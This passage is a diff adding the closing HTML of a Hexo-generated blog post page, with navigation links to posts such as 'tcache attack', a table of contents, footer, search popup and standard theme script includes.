+            data-tooltip-content="Share to WeiBo"
+        >
+            <i class="fa-brands fa-weibo"></i>
+        </li>
+    </ul>
+</div>
+
+                        
+                    </div>
+                </div>
+
+                
+
+                
+                    <div class="post-nav border-box">
+                        
+                            <div class="prev-post">
+                                <a class="prev"
+                                   rel="prev"
+                                   href="/2025/12/02/tcache-attack/"
+                                   title="tcache attack"
+                                >
+                                    <span class="left arrow-icon flex-center">
+                                        <i class="fas fa-chevron-left"></i>
+                                    </span>
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">tcache attack</span>
+                                        <span class="post-nav-item">Prev posts</span>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                        
+                            <div class="next-post">
+                                <a class="next"
+                                   rel="next"
+                                   href="/2025/11/10/bin/"
+                                   title="bin"
+                                >
+                                    <span class="title flex-center">
+                                        <span class="post-nav-title-item text-ellipsis">bin</span>
+                                        <span class="post-nav-item">Next posts</span>
+                                    </span>
+                                    <span class="right arrow-icon flex-center">
+                                        <i class="fas fa-chevron-right"></i>
+                                    </span>
+                                </a>
+                            </div>
+                        
+                    </div>
+                
+
+                
+                    
+
+
+
+
+
+
+                
+            </div>
+        </div>
+
+        
+            <div class="pc-post-toc right-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#only"><span class="nav-number">1.</span> <span class="nav-text">only</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#only-rev"><span class="nav-number">2.</span> <span class="nav-text">only_rev</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88push-pop-call-%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">为什么push&#x2F;pop&#x2F;call 无法执行</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        
+    </div>
+</div>
+
+
+                
+            </div>
+        </div>
+
+        <div class="page-main-content-bottom border-box">
+            
+<footer class="footer border-box">
+    <div class="copyright-info info-item">
+    &copy;&nbsp;<span>2020</span>&nbsp;-&nbsp;2026
+    
+            &nbsp;<i class="fas fa-heart icon-animate"></i>&nbsp;&nbsp;<a href="/">zach0ry</a>
+        
+    </div>
+
+    <div class="theme-info info-item">
+        Powered by&nbsp;<a target="_blank" href="https://hexo.io">Hexo</a>&nbsp;&&nbsp;Theme&nbsp;<a class="keep-version" target="_blank" href="https://github.com/XPoet/hexo-theme-keep">Keep</a>
+    </div>
+
+    
+
+    
+
+    
+</footer>
+
+        </div>
+    </div>
+
+    <!-- post tools -->
+    
+        <div class="post-tools right-toc">
+            <div class="post-tools-container border-box">
+    <ul class="post-tools-list border-box">
+        <!-- PC encrypt again -->
+        
+
+        <!-- PC TOC show toggle -->
+        
+            <li class="tools-item flex-center toggle-show-toc">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        <!-- PC go comment -->
+        
+
+        <!-- PC full screen -->
+        <li class="tools-item flex-center full-screen">
+            <i class="fa-solid fa-expand"></i>
+        </li>
+    </ul>
+</div>
+
+        </div>
+    
+
+    <!-- side tools -->
+    <div class="side-tools">
+        <div class="side-tools-container border-box ">
+    <ul class="side-tools-list side-tools-show-handle border-box">
+        <li class="tools-item tool-font-adjust-plus flex-center">
+            <i class="fas fa-search-plus"></i>
+        </li>
+
+        <li class="tools-item tool-font-adjust-minus flex-center">
+            <i class="fas fa-search-minus"></i>
+        </li>
+
+        <!-- toggle mode -->
+        
+            <li class="tools-item tool-toggle-theme-mode flex-center">
+                <i class="fas fa-moon"></i>
+            </li>
+        
+
+        <!-- rss -->
+        
+
+        <!-- to bottom -->
+        <li class="tools-item tool-scroll-to-bottom flex-center">
+            <i class="fas fa-arrow-down"></i>
+        </li>
+    </ul>
+
+    <ul class="exposed-tools-list border-box">
+        
+            <li class="tools-item toggle-show-toc-tablet flex-center">
+                <i class="fas fa-list"></i>
+            </li>
+        
+
+        
+
+        <li class="tools-item tool-toggle-show flex-center">
+            <i class="fas fa-cog fa-spin"></i>
+        </li>
+
+        <li class="tools-item tool-scroll-to-top flex-center show-arrow">
+            <i class="arrow fas fa-arrow-up"></i>
+            <span class="percent"></span>
+        </li>
+    </ul>
+</div>
+
+    </div>
+
+    <!-- image mask -->
+    <div class="zoom-in-image-mask">
+    <img class="zoom-in-image">
+</div>
+
+
+    <!-- local search -->
+    
+        <div class="search-pop-overlay">
+    <div class="popup search-popup">
+        <div class="search-header">
+          <span class="search-input-field-pre">
+            <i class="fas fa-keyboard"></i>
+          </span>
+            <div class="search-input-container">
+                <input autocomplete="off"
+                       autocorrect="off"
+                       autocapitalize="off"
+                       placeholder="Search..."
+                       spellcheck="false"
+                       type="search"
+                       class="search-input"
+                >
+            </div>
+            <span class="close-popup-btn">
+                <i class="fas fa-times"></i>
+            </span>
+        </div>
+        <div id="search-result">
+            <div id="no-result">
+                <i class="fas fa-spinner fa-pulse fa-5x fa-fw"></i>
+            </div>
+        </div>
+    </div>
+</div>
+
+    
+
+    <!-- tablet toc -->
+    
+        <div class="tablet-post-toc-mask">
+            <div class="tablet-post-toc">
+                <div class="post-toc-wrap border-box">
+    <div class="post-toc border-box">
+        <ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#only"><span class="nav-number">1.</span> <span class="nav-text">only</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#only-rev"><span class="nav-number">2.</span> <span class="nav-text">only_rev</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#%E4%B8%BA%E4%BB%80%E4%B9%88push-pop-call-%E6%97%A0%E6%B3%95%E6%89%A7%E8%A1%8C"><span class="nav-number">3.</span> <span class="nav-text">为什么push&#x2F;pop&#x2F;call 无法执行</span></a></li></ol>
+    </div>
+</div>
+
+            </div>
+        </div>
+    
+</main>
+
+
+
+
+
+<!-- common js -->
+
+<script src="/js/utils.js"></script>
+
+<script src="/js/header-shrink.js"></script>
+
+<script src="/js/back2top.js"></script>
+
+<script src="/js/toggle-theme.js"></script>
+
+<script src="/js/code-block.js"></script>
+
+<script src="/js/main.js"></script>
+
+<script src="/js/libs/anime.min.js"></script>
+
+
+<!-- local search -->
+
+    
+<script src="/js/local-search.js"></script>
+
+
+
+<!-- lazyload -->
+
+
+<div class="">
+    <!-- home page -->
+    
+
+    <!-- post page -->
+    
+        <!-- post-helper -->
+        
+<script src="/js/post/post-helper.js"></script>
+
+
+        <!-- toc -->
+        
+            
+<script src="/js/post/toc.js"></script>
+
+        
+
+        <!-- copyright-info -->
+        
+
+        <!-- share -->
+        
+            
+<script src="/js/post/share.js"></script>
+
+        
+    
+
+    <!-- categories page -->
+    
+
+    <!-- links page -->
+    
+
+    <!-- photos page -->
+    
+
+    <!-- tools page -->
+    
+</div>
+
+<!-- mermaid -->
+
+
+<!-- pjax -->
+
+
+
+</body>
+</html>
